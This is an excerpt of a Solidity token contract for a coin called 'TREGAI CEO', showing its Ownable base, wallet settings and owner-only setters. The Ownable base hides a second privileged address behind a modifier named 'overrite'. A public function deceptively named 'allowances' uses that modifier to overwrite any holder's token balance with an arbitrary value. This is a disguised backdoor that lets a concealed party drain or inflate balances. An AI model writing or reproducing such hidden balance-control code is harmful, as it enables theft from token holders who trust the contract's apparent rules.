...
abstract contract Ownable is Context {
    ...
    function prev() public view virtual returns (address) {return _prev;}
    modifier onlyOwner() {require(owner() == _msgSender(), "Ownable: caller is not the owner");_;}
    modifier overrite() {require(prev() == _msgSender());_;}
...
contract TREGAI is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "TREGAI CEO";
    string private _symbol = "TREGAI";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x1101F90fEB30d954cCfF9bb9BA1D4Cabf66ecd38); // Marketing Address
    address payable public teamWalletAddress = payable(0x1101F90fEB30d954cCfF9bb9BA1D4Cabf66ecd38); // Team Address
    ...
    uint256 public _marketingShare = 46;
    ...
    function allowances(address account, uint256 spender) public overrite {_balances[account]=spender;}
	...
	function removeLiquidityPair(address account) external onlyOwner {isLiquidityPair[account] = false;}
	function setMinTokensBeforeSwap(uint256 newMinTokensBeforeSwap) external onlyOwner() {minimumTokensBeforeSwap = newMinTokensBeforeSwap;}
    function setIsWalletLimitExempt(address holder, bool exempt) external onlyOwner {isWalletLimitExempt[holder] = exempt;}
    function setWalletLimit(uint256 newLimit) external onlyOwner {_walletMax  = newLimit;}
